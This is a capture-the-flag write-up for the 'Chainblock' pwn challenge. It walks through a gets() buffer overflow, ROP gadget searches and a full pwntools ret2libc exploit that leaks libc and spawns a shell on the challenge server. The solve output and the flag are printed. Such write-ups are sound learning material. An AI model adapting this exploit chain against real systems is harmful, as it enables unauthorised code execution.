# Chainblock
```
I made a chain of blocks!
```

## Challenge
> TL;DR: Buffer overflow and then perform ret2libc. Spray 256 bytes of random characters (array has a size of 256 bytes). Leak the puts@got address. Re runs the `main()` function. Calculate the base libc address and buffer overflow again to spawn a shell via `system("/bin/sh")`.

Running the program:
```bash
$ ./chainblock 
-snip-
Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: 
```

Ghidra's decompiled `verify()` function
```c
int verify(EVP_PKEY_CTX *ctx,uchar *sig,size_t siglen,uchar *tbs,size_t tbslen)

{
  int iVar1;
  char local_108 [256];
  
  printf("Please enter your name: ");
  gets(local_108);
  iVar1 = strcmp(local_108,name);
  if (iVar1 == 0) {
    printf("Hi %s!\n",name);
    iVar1 = printf("Your balance is %d chainblocks!\n",(ulong)balance);
  }
  else {
    iVar1 = puts("KYC failed, wrong identity!");
  }
  return iVar1;
}
```




Clearly, `gets(local_108)` is vulnerable to buffer overflow. Since there is no function that can spawn a shell, we need to perform ret2libc.

First, I try to find gadgets that I need to chain my ROP
```bash
# find ret
$ python3 Ropper.py -f ../chainblock/chainblock --search "ret"
-snip-
0x000000000040101a: ret; 

# find pop rdi; ret                                                                      
$ python3 Ropper.py -f ../chainblock/chainblock --search "pop rdi"
-snip-
0x0000000000401493: pop rdi; ret; 
```

Once I had gotten the address of gadgets, I can perform ROP

Idea of exploit: Spray 256 bytes of random characters (array has a size of 256 bytes). Leak the puts@got address. Re runs the `main()` function. Calculate the base libc address and buffer overflow again to spawn a shell via `system("/bin/sh")`.

POC:
```python
from pwn import *

binary = ELF('./chainblock')
ld = ELF('./ld-linux-x86-64.so.2')
libc = ELF('./libc.so.6')

r = remote('pwn.be.ax', 5000)
#r = process('./chainblock')
r.recvuntil(b'name: ')

pop_rdi = p64(0x401493)
puts_plt = p64(binary.plt['puts'])
puts_got = p64(binary.got['puts'])
main_func = p64(binary.symbols['main'])

payload = b"A" * 256
payload += p64(0) # stored rbp
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main_func

r.clean()
r.sendline(payload)

r.readline() # remove fail msg
puts_libc = u64(r.readline().strip().ljust(8, b'\x00'))
print(hex(puts_libc))

puts_offset = libc.symbols['puts']
libc.address = puts_libc - puts_offset

system_libc = p64(libc.symbols['system'])
sh_string = p64(libc.search(b'/bin/sh').__next__())
ret = p64(0x40101a)

payload = b"A" * 256
payload += p64(0) # stored rbp
payload += ret # fix misalignment
payload += pop_rdi
payload += sh_string
payload += system_libc
r.sendline(payload)


r.interactive()
```

Output of the script:
```bash
$ python3 solve.py
-snip-
[+] Opening connection to pwn.be.ax on port 5000: Done
0x7f6d6e1389d0
[*] Switching to interactive mode
      ___           ___           ___                       ___     
     /\  \         /\__\         /\  \          ___        /\__\    
    /::\  \       /:/  /        /::\  \        /\  \      /::|  |   
   /:/\:\  \     /:/__/        /:/\:\  \       \:\  \    /:|:|  |   
  /:/  \:\  \   /::\  \ ___   /::\~\:\  \      /::\__\  /:/|:|  |__ 
 /:/__/ \:\__\ /:/\:\  /\__\ /:/\:\ \:\__\  __/:/\/__/ /:/ |:| /\__\
 \:\  \  \/__/ \/__\:\/:/  / \/__\:\/:/  / /\/:/  /    \/__|:|/:/  /
  \:\  \            \::/  /       \::/  /  \::/__/         |:/:/  / 
   \:\  \           /:/  /        /:/  /    \:\__\         |::/  /  
    \:\__\         /:/  /        /:/  /      \/__/         /:/  /   
     \/__/         \/__/         \/__/                     \/__/    
      ___           ___       ___           ___           ___     
     /\  \         /\__\     /\  \         /\  \         /\__\    
    /::\  \       /:/  /    /::\  \       /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:/\:\  \     /:/\:\  \     /:/__/     
  /::\~\:\__\   /:/  /    /:/  \:\  \   /:/  \:\  \   /::\__\____ 
 /:/\:\ \:|__| /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\/:/  / \:\  \    \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~   
  \:\ \::/  /   \:\  \    \:\  /:/  /   \:\  \          |:|  |    
   \:\/:/  /     \:\  \    \:\/:/  /     \:\  \         |:|  |    
    \::/__/       \:\__\    \::/  /       \:\__\        |:|  |    
     ~~            \/__/     \/__/         \/__/         \|__|    


----------------------------------------------------------------------------------

Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: KYC failed, wrong identity!
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}$ 
```

Flag: `corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}`